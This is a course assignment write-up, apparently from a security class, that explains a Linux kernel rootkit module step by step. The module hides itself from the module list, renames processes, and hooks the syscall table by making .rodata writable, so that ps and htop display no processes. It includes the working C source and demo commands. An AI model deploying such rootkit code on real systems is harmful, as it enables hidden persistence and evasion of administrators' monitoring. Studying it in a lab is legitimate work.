## CSIE 5374 Assignment 1 Write-up

### Hide/Unhide module
```c
// rootkit.c
static bool module_is_hidden = false;
static struct list_head *prev_module;

case IOCTL_MOD_HIDE:
    if (module_is_hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        module_is_hidden = false;
        pr_info("rootkit: visible\n");
    } else {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        module_is_hidden = true;
        pr_info("rootkit: hidden\n");
    }
    break;
```

If the module is currently hidden, insert it after the recorded `prev_module` and mark it as unhidden.

If the module is currently unhidden, record its previous module (`prev_module`), remove it from the list, and mark it as hidden.

```c
// userspace program: rootkit_hide.c
int main() {
    int fd = open("/dev/rootkit", O_RDWR);
    ioctl(fd, IOCTL_MOD_HIDE);
    ...
}
```

Open the device file named `/dev/rootkit` in read-write mode.

Send an `ioctl` command to the opened device file to hide/unhide the module.

### Masquerade process name
```c
// rootkit.c
static struct masq_proc_req req;
static struct masq_proc *proc_list;
static struct task_struct *task;

case IOCTL_MOD_MASQ:
    if (copy_from_user(&req, (void*)arg, sizeof(struct masq_proc_req))) {
        pr_err("rootkit: copy_from_user failed\n");
        ret = -EFAULT;
        break;
    }
```

Use the `copy_from_user()` function to read a `struct masq_proc_req` from user space.

If the read is successful, the data will be stored in the kernel-space variable `req`.

```c
    proc_list = kmalloc(sizeof(struct masq_proc) * req.len, GFP_KERNEL);
    if (!proc_list) {
        pr_err("rootkit: kmalloc failed\n");
        ret = -ENOMEM;
        break;
    }
```

Allocate memory in kernel space using `kmalloc` for `req.len` number of `struct masq_proc`.

```c
    if (copy_from_user(proc_list, req.list, sizeof(struct masq_proc) * req.len)) {
        pr_err("rootkit: copy_from_user failed\n");
        ret = -EFAULT;
        break;
    }
```

Extract `req.len` number of `struct masq_proc` from `req.list` and copy them into the kernel-space variable `proc_list`.

```c
    for (int i = 0; i < req.len; i++) {
        for_each_process(task) {
            if (strncmp(task->comm, proc_list[i].orig_name, MASQ_LEN) == 0) {
                size_t original_name_len = strlen(task->comm);
                size_t new_name_len = strlen(proc_list[i].new_name);
                if (new_name_len < original_name_len) {
                    strscpy(task->comm, proc_list[i].new_name, TASK_COMM_LEN);
                    pr_info("rootkit: renamed '%s' to '%s'\n", proc_list[i].orig_name, proc_list[i].new_name);
                }
            }
        }
    }

    pr_info("rootkit: masq\n");
    kfree(proc_list);
    break;
```

Iterates over each masquerade rule provided by the user. Each rule contains an original name and a new name.

For every rule, the program scans all processes in the system to find those whose names match the original name.

If a matching process is found, it checks whether the new name is shorter than the original. If so, the process name is updated to the new name, and a success message is printed.

Finally, call `kfree(proc_list)` to release the allocated kernel memory.

```c
// userspace program: rootkit_masq.c
int main() {
    int fd = open("/dev/rootkit", O_RDWR);

    struct masq_proc procs[2];

    strncpy(procs[0].new_name, "very_long_process_name", MASQ_LEN - 1);
    procs[0].new_name[MASQ_LEN - 1] = '\0';
    strncpy(procs[0].orig_name, "sleep", MASQ_LEN - 1);
    procs[0].orig_name[MASQ_LEN - 1] = '\0';

    strncpy(procs[1].new_name, "owo", MASQ_LEN - 1);
    procs[1].new_name[MASQ_LEN - 1] = '\0';
    strncpy(procs[1].orig_name, "bash", MASQ_LEN - 1);
    procs[1].orig_name[MASQ_LEN - 1] = '\0';

    struct masq_proc_req req = {
        .len = 2,
        .list = procs
    };

    ioctl(fd, IOCTL_MOD_MASQ, &req);
    ...
}
```

The program constructs two masquerade rules, each specifying an original process name and a corresponding new name (one where the new name is longer than the original, and one where it is shorter).

These rules are packed into a request structure and sent to the kernel module via an `ioctl` call.

### Filter syscall

```c
// rootkit.c
static int __init rootkit_init(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
    ...
    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
```
A kprobe is set up to target the symbol `kallsyms_lookup_name`. 

After registration, the kernel places a probe at the symbol's address, and the resolved address of the function is stored in `kp.addr`.

Define a function pointer type called `kallsyms_lookup_name_t`.

Then, cast `kp.addr` to this type and assign it to `kallsyms_lookup_name_ptr`. This gives access to the `kallsyms_lookup_name` function's address, which can now be invoked directly.

Finally, call `unregister_kprobe(&kp)` to remove the kprobe.

```c
    start_rodata = kallsyms_lookup_name_ptr("__start_rodata");
    init_begin = kallsyms_lookup_name_ptr("__init_begin");
    section_size = init_begin - start_rodata;

    update_mapping_prot_ptr = (update_mapping_prot_t)kallsyms_lookup_name_ptr("update_mapping_prot");
    ...
```
With `kallsyms_lookup_name_ptr`, retrieve the addresses of `__start_rodata` and `__end_rodata` to identify the `.rodata` section in the kernel. Then, compute the size by subtracting the start address from the end address.

Retrieve the address of the `update_mapping_prot` function in the kernel and store it in `update_mapping_prot_ptr`. This pointer can then be used to temporarily modify the access permissions of read-only kernel sections, such as `.rodata`.

```c
    sys_call_table_ptr = (syscall_fn_t*)kallsyms_lookup_name_ptr("sys_call_table");
    ...
    #undef __SYSCALL
    #define __SYSCALL(nr, sym) \
        original_sys_call[nr] = sys_call_table_ptr[nr]; \
        hooked_sys_call[nr] = hooked_##sym;
    #include <asm/unistd.h>
    ...
}
```
The kernel symbol `sys_call_table` is resolved using `kallsyms_lookup_name_ptr`, and the returned address is cast to a `syscall_fn_t*` type and stored in `sys_call_table_ptr`. This allows subsequent access to or modification of the system call table.

The `__SYSCALL` macro is redefined so that, during compilation, each original system call function is stored in the `original_sys_call` array, while the corresponding hook version (`hooked_##sym`) is stored in the `hooked_sys_call` array. When ``<asm/unistd.h>`` is included, all system calls are expanded based on this new macro definition.

`hooked_##sym` is defined as below:
```c
#define HOOKED_SYSCALL(nr, sym) \
static long hooked_##sym(const struct pt_regs *regs) {                                                                                 \
    struct filter_list_item *filter_entry;                                                                                              \
    char current_comm[TASK_COMM_LEN];                                                                                                   \
                                                                                                                                        \
    get_task_comm(current_comm, current);                                                                                               \
    list_for_each_entry(filter_entry, &filter_list_head, list) {                                                                        \
        if (filter_entry->filter.syscall_nr == nr && strncmp(current_comm, filter_entry->filter.comm, TASK_FILTER_LEN) == 0) { \
            pr_info("rootkit: blocking syscall %s for process '%s'\n", #sym, current_comm);                                            \
            return -EPERM;                                                                                                              \
        }                                                                                                                               \
    }                                                                                                                                   \
                                                                                                                                        \
    return original_sys_call[nr](regs);                                                                                        \
}

#undef __SYSCALL
#define __SYSCALL(nr, sym) HOOKED_SYSCALL(nr, sym);
#include <asm/unistd.h>
```
A macro is defined to create hook functions for system calls. Each generated function fetches the name of the current process, evaluates it against predefined filter rules, and either blocks the call or proceeds to execute the original system call accordingly.

```c
static sys_call_t original_sys_call[__NR_syscalls];
static sys_call_t hooked_sys_call[__NR_syscalls];

struct filter_list_item {
    struct filter_info filter;
    struct list_head list;
};
static LIST_HEAD(filter_list_head);

static struct filter_info user_filter;
static struct filter_list_item *new_filter, *filter_entry, *tmp;

case IOCTL_ADD_FILTER:
    if (copy_from_user(&user_filter, (void*)arg, sizeof(struct filter_info))) {
        pr_err("rootkit: copy_from_user failed\n");
        ret = -EFAULT;
        break;
    }
```
Copy the `filter_info` structure sent from user space into the kernel-space variable `user_filter`.
```c
    new_filter = kmalloc(sizeof(struct filter_list_item), GFP_KERNEL);
    if (!new_filter) {
        pr_err("rootkit: kmalloc failed\n");
        ret = -ENOMEM;
        break;
    }
```
Allocate memory for a `struct filter_list_item`.
```c
    update_mapping_prot_ptr(__pa(start_rodata), start_rodata, section_size, PAGE_KERNEL);
    sys_call_table_ptr[user_filter.syscall_nr] = hooked_sys_call[user_filter.syscall_nr];
    update_mapping_prot_ptr(__pa(start_rodata), start_rodata, section_size, PAGE_KERNEL_RO);
```
Make rodata writable by utilizing `update_mapping_prot_ptr`.

Replace the system call at index `user_filter.syscall_nr` in the system call table with the corresponding hooked version from `hooked_sys_call`.

Make rodata readonly by utilizing `update_mapping_prot_ptr`.
```c
    memcpy(&new_filter->filter, &user_filter, sizeof(struct filter_info));
    INIT_LIST_HEAD(&new_filter->list);
    list_add_tail(&new_filter->list, &filter_list_head);

    pr_info("rootkit: added filter for syscall %d, process '%s'\n", user_filter.syscall_nr, user_filter.comm);
    break;
```
The `user_filter` data is copied into `new_filter->filter`. The list node is initialized, and the new filter is added to the tail of the `filter_list_head` list.
```c
case IOCTL_REMOVE_FILTER:
    if (copy_from_user(&user_filter, (void*)arg, sizeof(struct filter_info))) {
        pr_err("rootkit: copy_from_user failed\n");
        ret = -EFAULT;
        break;
    }

    list_for_each_entry_safe(filter_entry, tmp, &filter_list_head, list) {
        if (filter_entry->filter.syscall_nr == user_filter.syscall_nr && strncmp(filter_entry->filter.comm, user_filter.comm, TASK_FILTER_LEN) == 0) {
            list_del(&filter_entry->list);
            kfree(filter_entry);
            pr_info("rootkit: removed filter for syscall %d, process '%s'\n", user_filter.syscall_nr, user_filter.comm);
        }
    }

    break;
```
Iterates through the `filter_list_head` linked list using `list_for_each_entry_safe`.

For each filter entry, it checks whether the `syscall_nr` and `comm` (process name) match the values in `user_filter`. If a match is found, the entry is removed from the list using `list_del`, its memory is freed using `kfree`.

```c
static void __exit rootkit_exit(void) {
    struct filter_list_item *filter_entry, *tmp;

    make_rodata_writable();
    #undef __SYSCALL
    #define __SYSCALL(nr, sym) \
        if (sys_call_table_ptr[nr] != original_sys_call[nr]) \
            sys_call_table_ptr[nr] = original_sys_call[nr];
    #include <asm/unistd.h>
    make_rodata_readonly();

    list_for_each_entry_safe(filter_entry, tmp, &filter_list_head, list) {
        list_del(&filter_entry->list);
        kfree(filter_entry);
    }
    ...
}
```
Make rodata writable.

Redefines the `__SYSCALL` macro to restore original system calls: for each system call number, if the current function pointer in `sys_call_table_ptr` differs from the original, it is replaced with the original. This macro is applied by including ``<asm/unistd.h>``, which expands all defined system calls.

Make rodata readonly.

Finally, the function iterates through the `filter_list_head` linked list using `list_for_each_entry_safe`, removes each entry from the list, and frees its memory using `kfree`.

```c
// userspace program: rootkit_filter.c
int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s [add|remove] <process_name> <syscall_nr>\n", argv[0]);
        return 1;
    }

    const char *action = argv[1];
    const char *process_name = argv[2];
    int syscall_nr = atoi(argv[3]);
    
    int fd = open("/dev/rootkit", O_RDWR);

    struct filter_info filter = {
        .syscall_nr = syscall_nr
    };
    strncpy(filter.comm, process_name, TASK_FILTER_LEN - 1);
    filter.comm[TASK_FILTER_LEN - 1] = '\0';

    if (strcmp(action, "add") == 0) {
        assert(ioctl(fd, IOCTL_ADD_FILTER, &filter) == 0);
    } else if (strcmp(action, "remove") == 0){
        assert(ioctl(fd, IOCTL_REMOVE_FILTER, &filter) == 0);
    } else {
        assert(0);
    }
    ...
}
```
Expect three arguments: an action (add or remove), a process name, and a system call number. If not enough arguments are provided, it prints usage instructions.

Parse the arguments and constructs a `filter_info` structure, setting the `syscall_nr` and copying the process name into the `comm` field.

Depending on the action, it issues an `ioctl` call to either add or remove the filter via `IOCTL_ADD_FILTER` or `IOCTL_REMOVE_FILTER`.

### Bonus: blocking multiple syscalls for a single process

We will block `getcwd` (syscall 17) and `getuid` (syscall 174) for `python`.
Before enabling syscall filtering, these two commands work normally:
```shell
$ python -c 'import os; print(os.getcwd())'
/home/lashhw/template
$ python -c 'import os; print(os.getuid())'
1000
```

Then apply syscall blocking via userspace program `rootkit_filter.c`:
```shell
$ gcc rootkit_filter.c -o rootkit_filter
$ sudo ./rootkit_filter add python 17
$ sudo ./rootkit_filter add python 174
```

Running the same command as before, we see various error messages:
```shell
$ python -c 'import os; print(os.getcwd())'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
Error in sys.excepthook:
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/apport_python_hook.py", line 55, in apport_excepthook
    import apt_pkg
  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1002, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 945, in _find_spec
  File "<frozen importlib._bootstrap_external>", line 1439, in find_spec
  File "<frozen importlib._bootstrap_external>", line 1408, in _get_spec
  File "<frozen importlib._bootstrap_external>", line 1366, in _path_importer_cache
PermissionError: [Errno 1] Operation not permitted

Original exception was:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
$ python -c 'import os; print(os.getuid())'
-1
```

### Bonus: blocking specific syscalls across multiple processes

We will block `getdents64` (syscall 61) for `ps` and `htop`.
Before enabling syscall filtering, these two commands work normally:
```shell
$ ps
    PID TTY          TIME CMD
    811 pts/0    00:00:00 bash
   1013 pts/0    00:00:08 fish
   3564 pts/0    00:00:00 ps
$ htop
(normal htop is displayed)
```
Then apply syscall blocking via userspace program `rootkit_filter.c`:
```shell
$ gcc rootkit_filter.c -o rootkit_filter
$ sudo ./rootkit_filter add ps 61
$ sudo ./rootkit_filter add htop 61
```
Running the same command as before, no running processes is displayed:
```shell
$ ps
    PID TTY          TIME CMD
$ htop
(no process is displayed in htop)
```

### Questions
1. The core concept of Return-Oriented Programming is to extract gadgets from existing kernel code. These gadgets are typically instruction sequences that end with a `ret` instruction. Attackers use `ret` to jump from one gadget to the next in a controlled manner. Although each gadget performs only a simple operation, chaining them together enables the execution of complex logic.

    The system call filtering based approach is vulnerable to the so called Returned Oriented Programming attack, because attackers can repeatedly leverage existing kernel code (gadgets) to bypass intercepted syscalls.

    Provide a concrete attack example: Suppose we hooked `sys_write`. An attacker uses ROP techniques to reassemble existing kernel gadgets, creating an equivalent write operation without making a direct syscall, yet achieving the same effect as `sys_write`.

    Methods to Mitigate ROP Attacks:
    * Control Flow Integrity (CFI): CFI enforces strict control over program execution, ensuring function calls only jump to legitimate addresses, effectively preventing ROP attacks.
    * Address Space Layout Randomization (ASLR): ASLR randomizes the memory layout of kernel code, making it harder for attackers to predict addresses and locate useful gadgets.

2. 

### Reference

[linux kprobe使用-CSDN博客](https://blog.csdn.net/qq_42931917/article/details/129225214)

[Linux 内核函数kallsyms_lookup_name_linux 5.10 内核符号查找函数-CSDN博客](https://blog.csdn.net/weixin_45030965/article/details/132497956)